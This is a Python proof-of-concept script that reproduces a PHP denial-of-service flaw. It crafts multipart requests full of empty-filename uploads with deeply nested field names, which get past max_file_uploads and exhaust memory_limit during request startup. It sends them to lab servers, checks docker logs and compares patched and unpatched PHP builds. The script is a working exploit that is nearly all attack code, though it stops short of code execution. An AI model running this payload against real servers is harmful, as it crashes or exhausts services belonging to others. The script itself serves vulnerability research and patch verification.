#!/usr/bin/env python3
"""
CVE-2026-109618 OOM producer #2 (php2shell writeup): the empty-filename
nested-name metadata expansion.

Advisory mechanism under test (calif.io/php2shell, "You said OOM-fatal?"):
  "An RFC1867 file-upload part with filename=\"\" contains no file data,
   and PHP does not count it toward max_file_uploads. PHP still creates
   all six corresponding $_FILES entries: name, full_path, type, tmp_name,
   error, and size. When the form field name is nested, such as
   files[a][b][c]..., PHP must create that hierarchy separately for each
   of the six entries. One short empty-upload record expands into many
   native HashTables, Buckets and string-key allocations. Hundreds of
   these records can occupy more than the default 128 MiB PHP heap while
   their complete HTTP body remains below the default 8 MiB
   post_max_size. This lets us make a chosen later allocation hit
   memory_limit."

Stages:
  1. Calibration: a handful of records against probe.php — verifies the
     max_file_uploads bypass (FILES count == record count, above the
     default cap of 20) and measures the real per-record heap cost.
  2. Full payload: distinct root name per record (fresh HashTable chain
     each), deep nesting under max_input_nesting_level (64). Wire stays
     far below post_max_size; the parsed representation exceeds
     memory_limit -> OOM fatal during request startup (before any
     application code).
  3. Per-SAPI evidence:
     - mod_php 8.2.34 (:18082): startup OOM; request shutdown then runs
       unconditionally (GHSA-w8hw-w9fx-j79w) — watch the logs for how the
       invalid state is handled (honest ceiling: handled cleanly in this
       lab without a groomed state shape).
     - PHP-FPM 8.2.34 (:18080): startup OOM takes the process-exit branch
       (php_request_startup failure -> FPM child exits, respawns).
     - PHP-FPM 8.2.35 (:18081, patched): compare the post-patch behavior
       (ZEND_HAS_OOM clean parse bailout / delayed soft-OOM at a VM safe
       point — no mid-startup consumption of half-initialized state).

Usage:
  python3 verify_empty_upload_expansion.py --target http://127.0.0.1:18082
  python3 verify_empty_upload_expansion.py --target http://127.0.0.1:18080
  python3 verify_empty_upload_expansion.py --target http://127.0.0.1:18081

For authorized security testing against your own lab only.
"""
import argparse
import re
import socket
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "EMPTYEXPAND"


def build_records(count, depth):
    """Empty-filename upload parts with distinct deep-nested names.

    Each record: --B\r\nContent-Disposition: form-data;
    name="r<i>[a][a]..."; filename=""\r\n\r\n\r\n
    Distinct root per record => each registration builds a fresh
    HashTable chain; filename="" => not counted toward max_file_uploads.
    """
    out = []
    for i in range(count):
        name = f"r{i}" + "[a]" * (depth - 1)
        out.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
            f"\r\n\r\n"
        )
    out.append(f"--{BOUNDARY}--\r\n")
    return "".join(out).encode()


def post_multipart(host, port, path, body, timeout=300):
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def parse_probe(resp):
    ini, counts = {}, {}
    text = resp.decode("latin1", "replace")
    for line in text.splitlines():
        for k in ("memory_limit", "post_max_size"):
            if line.startswith(k + ":"):
                ini[k] = line.split(":", 1)[1].strip()
        m = re.match(r"(POST count|FILES count|memory peak): (\d+)", line)
        if m:
            counts[m.group(1)] = int(m.group(2))
    return ini, counts


def ini_to_bytes(v, default):
    if not v:
        return default
    m = re.match(r"(\d+)([KMG]?)", v.upper())
    if not m:
        return default
    n = int(m.group(1))
    return n * {"": 1, "K": 1024, "M": 1024 ** 2, "G": 1024 ** 3}[m.group(2)]


def mb(n):
    return f"{n / 1024 / 1024:.1f} MB"


def docker_logs_grep(container, seconds, patterns):
    try:
        r = subprocess.run(
            ["docker", "logs", "--since", f"{seconds}s", container],
            capture_output=True, text=True, timeout=30)
        blob = (r.stdout + r.stderr)
    except Exception as e:
        return [f"<docker logs unavailable: {e}>"]
    hits = []
    for line in blob.splitlines():
        if any(p.lower() in line.lower() for p in patterns):
            hits.append(line.strip())
    return hits[:12]


PORT_CONTAINERS = {
    18080: "php2shell-lab",
    18081: "php2shell-lab8235",
    18082: "php-asan-modphp-lab",
    18084: "php2shell-asan-fpm",
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18082")
    ap.add_argument("--probe", default="/expand_probe.php",
                   help="nested-safe probe endpoint")
    ap.add_argument("--cal-records", type=int, default=40,
                    help="calibration records (default 40 > max_file_uploads=20)")
    ap.add_argument("--depth", type=int, default=60,
                    help="nesting depth per record (default 60, under "
                         "max_input_nesting_level=64)")
    ap.add_argument("--count", type=int, default=0,
                    help="full-payload record count (default: computed from "
                         "calibration to comfortably exceed memory_limit)")
    ap.add_argument("--container", default=None,
                    help="container name for automatic docker-logs evidence "
                         "(default: guessed from the port)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80

    print("[*] CVE-2026-109618 OOM producer: empty-filename nested-name "
          "expansion")
    print(f"[*] Target: {args.target}")
    print()

    # --- stage 0: baseline + target limits ---
    r = post_multipart(host, port, args.probe, b"")
    ini0, base = parse_probe(r)
    limit = ini_to_bytes(ini0.get("post_max_size"), 8 * 1024 * 1024)
    mem = ini_to_bytes(ini0.get("memory_limit"), 128 * 1024 * 1024)
    baseline = base.get("memory peak", 2 * 1024 * 1024)
    print(f"[*] Target post_max_size: {ini0.get('post_max_size', '?')}"
          f"   memory_limit: {ini0.get('memory_limit', '?')}"
          f"   baseline peak: {mb(baseline)}")

    # --- stage 1: calibration ---
    cal_body = build_records(args.cal_records, args.depth)
    print(f"[1] Calibration: {args.cal_records} records x depth {args.depth}"
          f" (wire {len(cal_body)} bytes)")
    resp = post_multipart(host, port, args.probe, cal_body)
    ini1, counts = parse_probe(resp)
    files_count = counts.get("FILES count")
    peak = counts.get("memory peak")
    leaves = counts.get("FILES leaves")
    text = resp.decode("latin1", "replace")
    if files_count is None:
        print("    probe response not parseable — is the probe endpoint reachable?")
        print(text[:400])
        sys.exit(1)
    print(f"    FILES count: {files_count}"
          f" (max_file_uploads default is 20 —"
          f" {'BYPASSED' if files_count > 20 else 'check: not above 20'})")
    if leaves:
        print(f"    FILES leaves: {leaves}"
              f" (nested HashTable chain materialized)")
    for warn in ("exceeded", "nesting", "Input variables"):
        for line in text.splitlines():
            if warn in line and "Warning" in line:
                print(f"    [limit hit] {line.strip()[:150]}")
    if peak:
        per_record = max(peak - baseline, 1) / args.cal_records
        est_records = int((mem * 1.2) / per_record)
        print(f"    memory peak {mb(peak)} -> {per_record/1024:.0f} KB/record"
              f" -> ~{est_records} records to reach memory_limit")
    else:
        est_records = 1000
        print("    memory peak not readable; defaulting estimate to"
              f" ~{est_records} records")

    # --- stage 2: full payload (adaptive retry) ---
    # First shot from the calibration estimate; if the parse completes
    # below memory_limit, recompute from the run's own measured per-record
    # cost and fire again (bounded by wire < half of post_max_size).
    count = args.count or max(int(est_records * 1.5), args.cal_records * 20, 800)
    print()
    print("[2] Full payload: empty-filename nested-name expansion")
    oom = []
    for attempt in range(3):
        body = build_records(count, args.depth)
        wire = len(body)
        print(f"    attempt {attempt + 1}: {count} records x depth "
              f"{args.depth}, wire {mb(wire)}"
              f" (post_max_size {mb(limit)} — "
              f"{'UNDER' if wire < limit else 'OVER'} the limit)")
        if wire >= limit:
            print("    wire exceeds post_max_size — lowering count would"
                  " break the wire-under/heap-over property; stopping.")
            break
        t0 = time.time()
        resp = post_multipart(host, port, args.probe, body)
        dt = time.time() - t0
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
            if resp else "<no response / connection died>"
        print(f"    response: {status}   ({dt:.1f}s)")
        text = resp.decode("latin1", "replace") if resp else ""
        ini2, after = parse_probe(resp)
        oom = [l.strip() for l in text.splitlines()
               if "Allowed memory size" in l]
        for line in oom[:4]:
            print(f"    [EVIDENCE] {line[:220]}")
        if oom and "Unknown" in text and "line 0" in text:
            print("    [EVIDENCE] 'in Unknown on line 0' => the fatal fired")
            print("    during REQUEST STARTUP (multipart variable")
            print("    registration), before any application code — the")
            print("    CVE-2026-109618 condition.")
        if oom or not resp:
            break
        peak_after = after.get("memory peak")
        if not peak_after:
            break
        print(f"    no OOM; completed with memory peak {mb(peak_after)}"
              f" (memory_limit {mb(mem)})")
        if args.count:
            break  # explicit count is authoritative, don't auto-retry
        per_record = max(peak_after - baseline, 1) / count
        need = int((mem * 1.08 - peak_after) / per_record) + 50
        if need <= 0:
            break
        new_count = count + need
        retry_wire = len(build_records(new_count, args.depth))
        if retry_wire >= limit // 2:
            print("    retry would exceed wire budget; set --count manually"
                  " or raise post_max_size handling; stopping.")
            break
        count = new_count
    if not oom and resp and b"memory peak" not in resp:
        print("    [note] request died mid-startup (no probe output) —")
        print("    startup fatal likely; see the server-side evidence below.")
    elif not oom:
        print("    [note] no OOM observed — target may be patched (8.2.35+)")
        print("    or the estimate is off; see --count/--depth knobs.")

    # post-check: does the worker pool still answer? (mod_php survives the
    # startup OOM; FPM exits the child)
    alive = post_multipart(host, port, args.probe, b"")
    pool_alive = b"memory peak" in alive
    print(f"    post-check: worker pool answers follow-up request: "
          f"{'yes' if pool_alive else 'no'}")

    # --- stage 3: server-side evidence ---
    container = args.container or PORT_CONTAINERS.get(port)
    print()
    if container:
        print(f"[3] Server-side evidence (docker logs {container}):")
        lines = docker_logs_grep(container, 90, [
            "Allowed memory size", "exhausted", "child", "exited",
            "ASAN", "respawn", "FPM_EXIT",
        ])
        if lines:
            for line in lines:
                print(f"    {line[:200]}")
        else:
            print("    <no matching log lines in the last 90s>")


    print()
    print("[*] Interpretation per SAPI (GHSA-w8hw-w9fx-j79w):")
    print("    - mod_php: an OOM during request startup leaves partially-")
    print("      initialized state behind, and Apache unconditionally runs")
    print("      the request shutdown procedure over it. Observed in this")
    print("      lab: fatal at Zend/zend_hash.c (the hash-update path the")
    print("      writeup's stale-bucket analysis centers on), worker pool")
    print("      survives, no ASAN report with this ungroomed shape.")
    print("    - PHP-FPM: startup failure takes the process-exit branch —")
    print("      observed: 'child ... exited with code 70' (FPM_EXIT_SOFTWARE)")
    print("      and respawn; the invalid state dies with the worker.")
    print("    - PHP 8.2.35 (patched): observed — heap growth stays bounded")
    print("      (parse bails early via the ZEND_HAS_OOM checks / body-part")
    print("      accounting), no startup OOM, worker survives.")
    print("[*] Honest ceiling: producer/trigger reproduced; shutdown")
    print("    consumption of the invalid state -> corruption -> RCE is NOT")
    print("    reproduced (requires a groomed state shape with build-specific")
    print("    offsets; no public exploit exists — out of scope for this repo).")


if __name__ == "__main__":
    main()
